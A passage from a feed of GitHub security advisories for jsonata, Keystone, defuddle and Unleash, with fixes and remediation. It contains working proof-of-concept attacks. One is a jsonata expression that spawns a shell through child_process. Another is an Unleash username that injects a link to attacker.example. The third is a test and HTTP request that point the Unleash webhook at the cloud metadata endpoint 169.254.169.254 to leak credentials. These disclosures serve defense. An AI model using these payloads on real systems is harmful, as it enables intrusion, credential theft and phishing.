<p>This was fixed with <a href="https://github.com/jsonata-js/jsonata/pull/794">https://github.com/jsonata-js/jsonata/pull/794</a>, which is included in the <code>2.2.0</code> release, and ported in the <code>1.8.8</code> release.</p>
<h2 id="poc">PoC</h2>
<pre><code class="language-js">import jsonata from "jsonata";

const expression = jsonata(`
(
   __lookupSetter__('__proto__')(constructor);
   __defineGetter__('l', constructor("return
process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'}).toString()"));
   valueOf().l
)
`);

await expression.evaluate({});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/794">https://github.com/jsonata-js/jsonata/pull/794</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e">https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d">https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8gq3-vp5j-2grp">https://github.com/advisories/GHSA-8gq3-vp5j-2grp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gq3-vp5j-2grp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-21T20:57:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@keystone-6/core] Keystone vulnerable to `graphql.maxTake` bypass with negative `take`]]></title>
        <id>https://github.com/advisories/GHSA-cqmq-8755-7xvh</id>
        <link href="https://github.com/advisories/GHSA-cqmq-8755-7xvh"/>
        <updated>2026-08-21T20:55:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The value of <code>graphql.maxTake</code> can be bypassed by providing a negative input.
This can be used to exceed the developer's intended <code>graphql.maxTake</code> value, allowing queries to return results in excess of the <code>graphql.maxTake</code> value set.</p>
<h1 id="impact">Impact</h1>
<p>This affects any project relying on <code>graphql.maxTake</code> to bound the number of items returned per query.</p>
<h1 id="patches">Patches</h1>
<p>This issue has been patched in <code>@keystone-6/core</code> version <code>6.5.3</code>.</p>
<p>If you cannot patch, you can workaround this by restricting <code>take</code> input values in your GraphQL queries to the bounded value, or by blocking negative values.</p>
<h1 id="credit">Credit</h1>
<p>This issue was found by <a href="https://haxset.com">Haxset's</a> Security Scanner and validated by their team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keystonejs/keystone/security/advisories/GHSA-cqmq-8755-7xvh">https://github.com/keystonejs/keystone/security/advisories/GHSA-cqmq-8755-7xvh</a></li>
<li><a href="https://github.com/keystonejs/keystone/pull/9859">https://github.com/keystonejs/keystone/pull/9859</a></li>
<li><a href="https://github.com/keystonejs/keystone/commit/9fb88b246950ce4de754a43fe6416f20403577b1">https://github.com/keystonejs/keystone/commit/9fb88b246950ce4de754a43fe6416f20403577b1</a></li>
<li><a href="https://github.com/keystonejs/keystone/releases/tag/@keystone-6/core@6.5.3">https://github.com/keystonejs/keystone/releases/tag/@keystone-6/core@6.5.3</a></li>
<li><a href="https://github.com/advisories/GHSA-cqmq-8755-7xvh">https://github.com/advisories/GHSA-cqmq-8755-7xvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqmq-8755-7xvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-21T20:55:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[defuddle] Defuddle vulnerable to XSS via unescaped attribute interpolation in site extractors]]></title>
        <id>https://github.com/advisories/GHSA-jg4p-g6xj-4qmf</id>
        <link href="https://github.com/advisories/GHSA-jg4p-g6xj-4qmf"/>
        <updated>2026-08-21T20:54:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An Improper Neutralization of Input During Web Page Generation issue in the site extractor component allows an attacker-controlled attribute value to be injected into output HTML without escaping. An attacker who crafts a malicious HTML page or controls content on a matching domain can execute arbitrary scripts when a victim processes the page, resulting in Cross-Site Scripting (XSS).  This affects defuddle through 0.19.0 and has been patched in version 0.19.1.</p>
<h2 id="impact">Impact</h2>
<p>This vulnerability allows for Cross-Site Scripting (XSS) execution without needing to compromise external websites. Affected consumers include:</p>
<ul>
<li>Obsidian Web Clipper, </li>
<li>web services serving the parsed output directly as HTML, and </li>
<li>any downstream application rendering the unsanitized HTML results</li>
</ul>
<h2 id="patch">Patch</h2>
<p>This issue has been patched in defuddle version 0.19.1. Users are encouraged to update to the latest release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kepano/defuddle/security/advisories/GHSA-jg4p-g6xj-4qmf">https://github.com/kepano/defuddle/security/advisories/GHSA-jg4p-g6xj-4qmf</a></li>
<li><a href="https://github.com/kepano/defuddle/pull/326">https://github.com/kepano/defuddle/pull/326</a></li>
<li><a href="https://github.com/kepano/defuddle/commit/baf2eaef61d334ef595b28c89e5c5e89e52daf7f">https://github.com/kepano/defuddle/commit/baf2eaef61d334ef595b28c89e5c5e89e52daf7f</a></li>
<li><a href="https://github.com/kepano/defuddle/releases/tag/0.19.1">https://github.com/kepano/defuddle/releases/tag/0.19.1</a></li>
<li><a href="https://github.com/advisories/GHSA-jg4p-g6xj-4qmf">https://github.com/advisories/GHSA-jg4p-g6xj-4qmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jg4p-g6xj-4qmf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-21T20:54:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Global Mustache.escape override disables HTML escaping process-wide, enabling Slack/Teams link-injection via unrestricted username]]></title>
        <id>https://github.com/advisories/GHSA-w4mq-xh27-6xpx</id>
        <link href="https://github.com/advisories/GHSA-w4mq-xh27-6xpx"/>
        <updated>2026-08-21T19:14:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>src/lib/addons/feature-event-formatter-md.ts</code>
<strong>Line</strong>: 355 (in v8.0.1; <code>format()</code> method)</p>
<h3 id="root-cause">Root Cause</h3>
<p><code>FeatureEventFormatterMd.format()</code> does:</p>
<pre><code class="language-ts">Mustache.escape = (text) =&gt; text;
const text = Mustache.render(action, context);
</code></pre>
<p><code>mustache</code> (pinned <code>^4.2.0</code>, confirmed installed <code>4.2.0</code>) keeps <code>escape</code> as a <strong>module-level singleton</strong> (<code>mustache.js</code>: <code>mustache.escape = escapeHtml;</code>), read by every <code>Mustache.render()</code> call in the process unless a per-call <code>config.escape</code> override is passed (<code>var escape = this.getConfigEscape(config) || mustache.escape;</code>). Node's module cache guarantees every <code>import Mustache from 'mustache'</code> in the process — <code>feature-event-formatter-md.ts</code>, <code>email-service.ts</code>, <code>webhook.ts</code>, <code>datadog.ts</code>, <code>new-relic.ts</code> — shares the same object instance.</p>
<p>This assignment therefore <strong>permanently disables HTML escaping for every other <code>Mustache.render()</code> call in the same Node process</strong> (including <code>email-service.ts</code> templates) from the moment any single notification addon (Webhook, Slack legacy, Microsoft Teams, Datadog, New Relic) first formats any event, for the remaining lifetime of the process.</p>
<p><code>feature-event-formatter-md-events.ts</code> (<code>EVENT_MAP</code>) confirms the blast radius: nearly every event's <code>action</code> template interpolates attacker-controlled values with single-mustache (intended-to-be-escaped) syntax, most importantly <code>{{user}}</code>, which is <code>event.createdBy</code> — the acting account's <code>username</code> (or <code>email</code> if set; <code>src/lib/util/extract-user.ts</code>: <code>extractUsernameFromUser</code>). Neither <code>username</code> nor <code>name</code> have any charset/length validation anywhere in the codebase (<code>create-user-schema.ts</code>, <code>create-invited-user-schema.ts</code>, <code>user-service.ts:289</code> only does <code>Joi.assert(name, Joi.string(), 'Name')</code> — a type check, nothing more).</p>
<p>Slack's own API docs require <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> to be replaced with <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code> before sending user-generated text, specifically so Slack's mrkdwn parser does not interpret it as <code>&lt;url|label&gt;</code> link syntax. Mustache's default <code>escapeHtml</code> happens to produce exactly those entities, so this was (likely unintentionally) the application's only defense against link-injection in chat notifications — and it is unconditionally switched off by the same code path that depends on it.</p>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Admin has a Webhook, Slack (legacy), Microsoft Teams, Datadog, or New Relic integration configured (a very common production setup for flag-change notifications).</li>
<li>Attacker has (or self-registers, if public signup is enabled — <code>POST /invite/:token/signup</code> is <code>permission: NONE</code>) any <strong>Editor</strong>-level account and sets <code>username</code> to e.g. <code>evil&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;</code>.</li>
<li>Attacker performs any ordinary write action (create/update/toggle a feature flag — routine, no special privilege beyond Editor on one project).</li>
<li>The configured addon's <code>handleEvent()</code> calls <code>this.msgFormatter.format(event)</code>, which mutates the global escape function and immediately renders the <code>{{user}}</code>-containing template with escaping disabled.</li>
<li>The resulting message — containing the attacker's raw <code>&lt;url|label&gt;</code> Slack link syntax — is POSTed to the team's Slack/Teams channel or webhook endpoint and rendered as a real, clickable, attacker-labeled hyperlink inside a trusted automated notification feed.</li>
</ol>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<pre><code class="language-ts">Mustache.escape = (text) =&gt; text;

const text = Mustache.render(action, context);
const url = path
    ? `${this.unleashUrl}${Mustache.render(path, context)}`
    : undefined;
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored markdown/link-injection (phishing-link injection) into any configured outbound notification channel (Slack legacy, MS Teams, Webhook default markdown, Datadog, New Relic), using an attacker-controlled username — no admin privilege required, only Editor on a single project, and potentially reachable through public self-signup.</li>
<li>Secondary: loss of HTML escaping for any other reachable Mustache single-mustache placeholder process-wide until restart (increases severity of any other currently-unreached or future Mustache sink, e.g. email templates).</li>
<li>Tertiary: a custom Webhook <code>bodyTemplate</code> that interpolates raw event/user fields directly into a JSON string literal (rather than the pre-escaped <code>eventJson</code> field the code already provides for this purpose) can have its JSON structure broken by an attacker-controlled <code>"</code> character once the global escape function is neutered.</li>
</ul>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Never mutate the shared <code>Mustache.escape</code> global. Pass a local escape function via Mustache's per-call render option instead (supported and typed in <code>@types/mustache@4.2.6</code>'s <code>RenderOptions.escape</code>):</p>
<pre><code class="language-ts">const renderConfig = { escape: (text: string) =&gt; text };
const text = Mustache.render(action, context, undefined, renderConfig);
const url = path
    ? `${this.unleashUrl}${Mustache.render(path, context, undefined, renderConfig)}`
    : undefined;
</code></pre>
<h3 id="verification">Verification</h3>
<p>Dynamically confirmed on v8.0.1 in a local Docker lab (official <code>unleashorg/unleash-server:8.0.1</code> image + Postgres 15):</p>
<ul>
<li>Created a Webhook addon with the addon UI's own placeholder <code>bodyTemplate</code> (<code>{{event.createdBy}}</code> etc.), pointed at a local listener.</li>
<li>Created an Editor-role user with <code>username = evil2&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;</code> (accepted with HTTP 201, no sanitization).</li>
<li>Logged in as that user and created a feature flag (ordinary Editor action).</li>
<li>Captured webhook payload: <code>"createdBy": "evil2&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;"</code> — <code>&lt;</code>, <code>&gt;</code>, <code>|</code> completely unescaped, live Slack link-injection syntax.</li>
<li>Control test with the same pinned <code>mustache@4.2.0</code> package confirmed the default (pre-bug) output for the same string would have been <code>evil2&amp;lt;https:&amp;#x2F;&amp;#x2F;attacker.example&amp;#x2F;urgent-rollback|Click here to view incident&amp;gt;</code> — i.e. the single global assignment is solely responsible for the unescaped output observed live.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-w4mq-xh27-6xpx">https://github.com/Unleash/unleash/security/advisories/GHSA-w4mq-xh27-6xpx</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/002012cfdbedd2e9b7db9dc83b9f549f761db22e">https://github.com/Unleash/unleash/commit/002012cfdbedd2e9b7db9dc83b9f549f761db22e</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.3">https://github.com/Unleash/unleash/releases/tag/v8.0.3</a></li>
<li><a href="https://github.com/advisories/GHSA-w4mq-xh27-6xpx">https://github.com/advisories/GHSA-w4mq-xh27-6xpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w4mq-xh27-6xpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers]]></title>
        <id>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</id>
        <link href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj"/>
        <updated>2026-08-21T19:14:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target <code>url</code> parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's <code>parameters.url</code> and passed straight to the HTTP client (<code>ky</code>) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example <code>http://169.254.169.254/latest/meta-data/…</code> (cloud IMDS), <code>http://127.0.0.1:&lt;port&gt;/…</code> (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.</p>
<p>The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured <code>Authorization</code> header and arbitrary <code>customHeaders</code> to whatever host the <code>url</code> points at (Datadog forwards <code>DD-API-KEY</code>), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.</p>
<p>Creating/updating addons is gated by the root permissions <code>CREATE_ADDON</code> / <code>UPDATE_ADDON</code>. These are not the super-admin <code>ADMIN</code> permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.</p>
<h2 id="affected-code-v800">Affected code (v8.0.0)</h2>
<p>The base addon issues the outbound request with the raw URL and no host checks (<code>src/lib/addons/addon.ts</code>):</p>
<pre><code class="language-ts">async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise&lt;Response&gt; {
    try {
        const res = await ky(url, {            // &lt;-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
</code></pre>
<p>The webhook provider passes the operator-supplied <code>parameters.url</code> (and forwards <code>authorization</code> + <code>customHeaders</code>) directly into that sink (<code>src/lib/addons/webhook.ts</code>):</p>
<pre><code class="language-ts">const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // &lt;-- configured secret forwarded to `url`
        ...extraHeaders,                              // &lt;-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // &lt;-- server dials attacker-chosen host
</code></pre>
<p>The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (<code>src/lib/services/addon-service.ts</code> → <code>validateKnownProvider</code>, <code>validateRequiredParameters</code>). The addon parameter schema (<code>src/lib/services/addon-schema.ts</code>) treats <code>url</code> as a free-form string; the <code>type: 'url'</code> field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of <code>src/lib/addons</code> and <code>addon-service.ts</code> for <code>169.254</code>, <code>127.0</code>, <code>localhost</code>, <code>private</code>, <code>ssrf</code>, <code>isAllowed</code>, <code>validateUrl</code> returns zero guards. The same unguarded <code>fetchRetry(url, …)</code> sink backs the Slack, Teams, Datadog, and New Relic providers.</p>
<p>The route gate (<code>src/lib/routes/admin-api/addon.ts</code>) requires the root permission <code>CREATE_ADDON</code> (create) / <code>UPDATE_ADDON</code> (update); <code>src/lib/types/permissions.ts</code> lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from <code>ADMIN</code>.</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is an authenticated Unleash user (or an admin API token) holding the root permission <code>CREATE_ADDON</code> or <code>UPDATE_ADDON</code>. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with <code>parameters.url</code> set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.</p>
<h2 id="impact">Impact</h2>
<p>The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (<code>169.254.169.254</code>) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured <code>Authorization</code> header and any <code>customHeaders</code> (and, for the Datadog provider, the <code>DD-API-KEY</code>) to the attacker-chosen host, since those headers are sent to whatever <code>url</code> is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
<p>This PoC drives the <strong>real</strong> <code>WebhookAddon.handleEvent</code> from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured <code>Authorization</code> and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.</p>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
</code></pre>
<h3 id="file-1--vitestpocconfigts-project-root">File 1 — <code>vitest.poc.config.ts</code> (project root)</h3>
<p>The repo's default vitest config has a Postgres <code>globalSetup</code>; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.</p>
<pre><code class="language-ts">import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
</code></pre>
<h3 id="file-2--srclibaddonsssrf-poctestts">File 2 — <code>src/lib/addons/ssrf-poc.test.ts</code></h3>
<pre><code class="language-ts">// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () =&gt; {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) =&gt; false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise&lt;{
    url: string;
    hits: Array&lt;{ path: string; auth?: string; secret?: string; body: string }&gt;;
    close: () =&gt; Promise&lt;void&gt;;
}&gt; {
    const hits: Array&lt;{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }&gt; = [];
    return new Promise((resolve) =&gt; {
        const server = http.createServer((req, res) =&gt; {
            let body = '';
            req.on('data', (c) =&gt; (body += c));
            req.on('end', () =&gt; {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () =&gt; {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =&gt;
                    new Promise((r) =&gt; server.close(() =&gt; r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () =&gt; {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () =&gt; {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -&gt; internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () =&gt; {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -&gt; proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
</code></pre>
<h3 id="observed-output-real-run-against-v800">Observed output (real run against v8.0.0)</h3>
<pre><code> RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -&gt; internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
</code></pre>
<p>The internal loopback listener received the request (<code>path</code> = the metadata path), with the configured <code>Authorization: Bearer operator-webhook-secret</code> and <code>X-Internal-Secret: leaked-to-internal-host</code> headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: <code>POST /api/admin/addons</code> with <code>{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }</code> (requires <code>CREATE_ADDON</code>), then create any feature flag to trigger the outbound request.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate the addon <code>url</code> server-side before it is ever dialed, both at create/update time (<code>addon-service.ts</code>) and again at request time (<code>addon.ts</code> <code>fetchRetry</code>). Specifically: require <code>http</code>/<code>https</code> only; resolve the hostname and reject the request if any resolved address is loopback (<code>127.0.0.0/8</code>, <code>::1</code>), link-local (<code>169.254.0.0/16</code>, <code>fe80::/10</code>, including the <code>169.254.169.254</code>/<code>fd00:ec2::254</code> metadata addresses), private (<code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>fc00::/7</code>), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a <code>30x</code> cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on <code>Addon.fetchRetry</code> (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured <code>Authorization</code>/<code>customHeaders</code> to non-allow-listed hosts to contain credential leakage.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1">https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/advisories/GHSA-5vf6-jrqr-78fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
